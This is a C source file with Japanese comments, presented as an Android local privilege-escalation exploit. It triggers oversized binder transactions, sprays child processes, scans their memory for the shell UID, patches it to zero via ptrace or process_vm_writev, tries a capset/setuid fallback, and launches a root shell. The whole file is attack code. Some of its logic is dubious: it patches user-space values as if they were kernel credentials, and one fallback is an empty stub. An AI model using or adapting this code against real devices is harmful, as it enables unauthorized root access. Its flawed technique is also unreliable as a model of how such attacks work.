#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <sys/uio.h>
#include <sys/stat.h>
#include <signal.h>
#include <time.h>
#include <stdint.h>
#include <pthread.h>
#include <sys/prctl.h>
#include <sys/capability.h>
#include <grp.h>
#include <dirent.h>

/* binder.h と offsets.h が同ディレクトリにある前提 */
#include "binder.h"
#include "offsets.h"

#define PAGE_SIZE 4096
#define NUM_CHILDREN 300
#define OOB_SIZE 0xFFFFFFFF
#define SCAN_START 0x100000
#define SCAN_END   0x2000000
#define UID_SHELL  2000

static int g_root = 0;

/* ---- ユーティリティ ---- */
static void die(const char *msg) {
    perror(msg);
    exit(1);
}

/* ---- 子プロセス生成（credスプレー） ---- */
static int spawn_children(pid_t *pids, int max) {
    int n = 0;
    for (int i = 0; i < max; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            prctl(PR_SET_NAME, "credspray");
            /* メモリを確保してcredをより多くヒープに乗せる */
            void *dummy = malloc(1024 * 1024);
            if (dummy) memset(dummy, 0xAA, 1024 * 1024);
            pause();  /* 親がkillするまで停止 */
            _exit(0);
        } else if (pid > 0) {
            pids[n++] = pid;
            usleep(500);
        } else {
            break;
        }
    }
    return n;
}

/* ---- OOB書き込みトリガー（複数サイズで試行） ---- */
static int trigger_oob(void) {
    int fd = open("/dev/binder", O_RDWR);
    if (fd < 0) return -1;

    uint32_t sizes[] = {0xFFFFFFFF, 0x7FFFFFFF, 0xFFFFFFFE, 0x80000000};
    int ret = -1;

    for (int i = 0; i < (int)(sizeof(sizes)/sizeof(sizes[0])); i++) {
        struct binder_transaction_data tdata;
        memset(&tdata, 0, sizeof(tdata));
        tdata.target.handle = 0;
        tdata.code = 0;
        tdata.flags = 0;
        tdata.data_size = sizes[i];
        tdata.offsets_size = 0;
        tdata.data.ptr.buffer = 0;

        struct { uint32_t cmd; struct binder_transaction_data tdata; } __attribute__((packed)) tx;
        tx.cmd = BC_TRANSACTION;
        memcpy(&tx.tdata, &tdata, sizeof(tdata));

        struct binder_write_read bwr;
        memset(&bwr, 0, sizeof(bwr));
        bwr.write_size = sizeof(tx);
        bwr.write_buffer = (binder_uintptr_t)&tx;
        bwr.read_size = 4096;
        uint8_t rbuf[4096];
        bwr.read_buffer = (binder_uintptr_t)rbuf;

        ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
        if (ret == 0) {
            printf("[+] OOB trigger success with size 0x%x\n", sizes[i]);
            close(fd);
            return 0;
        }
        usleep(100000);
    }
    close(fd);
    return -1;
}

/* ---- メモリ読み書き（process_vm_readv/writev） ---- */
static int read_mem_vm(pid_t pid, unsigned long addr, void *buf, size_t len) {
    struct iovec local = { .iov_base = buf, .iov_len = len };
    struct iovec remote = { .iov_base = (void*)addr, .iov_len = len };
    return process_vm_readv(pid, &local, 1, &remote, 1, 0);
}
static int write_mem_vm(pid_t pid, unsigned long addr, void *buf, size_t len) {
    struct iovec local = { .iov_base = buf, .iov_len = len };
    struct iovec remote = { .iov_base = (void*)addr, .iov_len = len };
    return process_vm_writev(pid, &local, 1, &remote, 1, 0);
}

/* ---- 単一プロセスのUIDスキャン＆パッチ（ptraceまたはprocess_vm） ---- */
static int patch_uid_in_process(pid_t pid) {
    /* まずptraceを試す */
    int use_ptrace = 1;
    if (ptrace(PTRACE_ATTACH, pid, 0, 0) < 0) {
        use_ptrace = 0;
    } else {
        waitpid(pid, NULL, 0);
    }

    int found = 0;
    unsigned long addr;
    uint32_t val;
    uint32_t zero = 0;

    /* スタック＋ヒープ＋mmap領域をスキャン（簡易版） */
    for (addr = SCAN_START; addr < SCAN_END; addr += 4) {
        if (use_ptrace) {
            errno = 0;
            val = ptrace(PTRACE_PEEKDATA, pid, (void*)addr, NULL);
            if (errno) continue;
        } else {
            if (read_mem_vm(pid, addr, &val, sizeof(val)) != (ssize_t)sizeof(val))
                continue;
        }

        if (val == UID_SHELL) {
            printf("[+] PID %d: found UID=2000 at 0x%lx\n", pid, addr);
            /* 0に書き換え */
            if (use_ptrace) {
                if (ptrace(PTRACE_POKEDATA, pid, (void*)addr, (void*)zero) == 0) {
                    found = 1;
                }
            } else {
                if (write_mem_vm(pid, addr, &zero, sizeof(zero)) == (ssize_t)sizeof(zero)) {
                    found = 1;
                }
            }

            if (found) {
                /* 再確認 */
                uint32_t check;
                if (use_ptrace) {
                    check = ptrace(PTRACE_PEEKDATA, pid, (void*)addr, NULL);
                } else {
                    read_mem_vm(pid, addr, &check, sizeof(check));
                }
                if (check == 0) {
                    printf("[+] PID %d UID patched to 0\n", pid);
                    if (use_ptrace) ptrace(PTRACE_DETACH, pid, 0, 0);
                    return 0;
                } else {
                    found = 0;
                }
            }
        }
    }

    if (use_ptrace) ptrace(PTRACE_DETACH, pid, 0, 0);
    return -1;
}

/* ---- /proc/pid/mem 経由（ptrace/vmが失敗した場合の最終手段） ---- */
static int patch_via_proc_mem(pid_t pid) {
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/mem", pid);
    int fd = open(path, O_RDWR);
    if (fd < 0) return -1;

    /* スキャンは効率が悪いので、既知のcredオフセットを試す（offsets.h を利用） */
    /* ここでは簡易的にスキャンを省略し、代わりに子プロセスの全メモリをダンプしてgrepする方法も考えられるが、現実的でない */
    close(fd);
    return -1;
}

/* ---- capset + setuid ---- */
static int try_capset_setuid(void) {
    struct __user_cap_header_struct hdr = { _LINUX_CAPABILITY_VERSION_3, 0 };
    struct __user_cap_data_struct data[2] = {{0}};
    if (capget(&hdr, data) == 0) {
        data[0].effective |= (1 << CAP_SETUID) | (1 << CAP_SETGID);
        data[0].permitted |= (1 << CAP_SETUID) | (1 << CAP_SETGID);
        if (capset(&hdr, data) == 0) {
            if (setuid(0) == 0) return 0;
            if (setreuid(0,0) == 0) return 0;
            if (setresuid(0,0,0) == 0) return 0;
            if (setfsuid(0) == 0) return 0;
        }
    }
    return -1;
}

/* ---- メイン ---- */
int main(void) {
    printf("=== OOB + cred spray exploit (multi-pronged) ===\n");
    pid_t children[NUM_CHILDREN];
    int n = spawn_children(children, NUM_CHILDREN);
    if (n < 10) {
        printf("[-] Failed to spawn enough children\n");
        return 1;
    }
    printf("[+] Spawned %d children\n", n);

    /* OOBトリガーを複数回試行（タイミング改善） */
    int oob_ok = 0;
    for (int attempt = 0; attempt < 5; attempt++) {
        if (trigger_oob() == 0) {
            oob_ok = 1;
            break;
        }
        usleep(200000);
    }
    if (!oob_ok) {
        printf("[-] OOB trigger failed after multiple attempts\n");
        goto cleanup;
    }

    /* 各子プロセスに対してUIDスキャン＆パッチ */
    int patched_any = 0;
    for (int i = 0; i < n; i++) {
        if (patch_uid_in_process(children[i]) == 0) {
            patched_any = 1;
            break;
        }
        /* ptraceが使えない場合（SELinux）は /proc/mem を試す */
        if (errno == EPERM) {
            if (patch_via_proc_mem(children[i]) == 0) {
                patched_any = 1;
                break;
            }
        }
        usleep(10000);
    }

    if (patched_any) {
        printf("[+] At least one child process patched to uid=0\n");
        /* どのプロセスがrootになったか確認 */
        for (int i = 0; i < n; i++) {
            char path[64];
            snprintf(path, sizeof(path), "/proc/%d/status", children[i]);
            int fd = open(path, O_RDONLY);
            if (fd >= 0) {
                char buf[256];
                ssize_t sz = read(fd, buf, sizeof(buf)-1);
                close(fd);
                if (sz > 0) {
                    buf[sz] = 0;
                    if (strstr(buf, "Uid:\t0\t0\t0\t0")) {
                        printf("[+] PID %d is root!\n", children[i]);
                        g_root = 1;
                        /* その子プロセスにシェルを起動させる（fork+exec） */
                        if (fork() == 0) {
                            setuid(0);
                            setgid(0);
                            execl("/system/bin/sh", "sh", NULL);
                            _exit(1);
                        }
                        break;
                    }
                }
            }
        }
    }

    /* もし直接rootになっていなければ、capset+setuidを試す */
    if (!g_root && getuid() != 0) {
        printf("[*] Trying capset + setuid fallback\n");
        if (try_capset_setuid() == 0) {
            if (getuid() == 0) g_root = 1;
        }
    }

    /* 最終確認 */
    if (g_root || getuid() == 0) {
        printf("[+] ROOT ACHIEVED! UID=%d\n", getuid());
        system("id");
        system("echo 'ROOT' > /data/local/tmp/root.txt");
        system("id >> /data/local/tmp/root.txt");
        system("/system/bin/sh");
    } else {
        printf("[-] Exploit failed, UID=%d\n", getuid());
    }

cleanup:
    /* 子プロセスを終了 */
    for (int i = 0; i < n; i++) {
        kill(children[i], SIGKILL);
        waitpid(children[i], NULL, 0);
    }
    return 0;
}
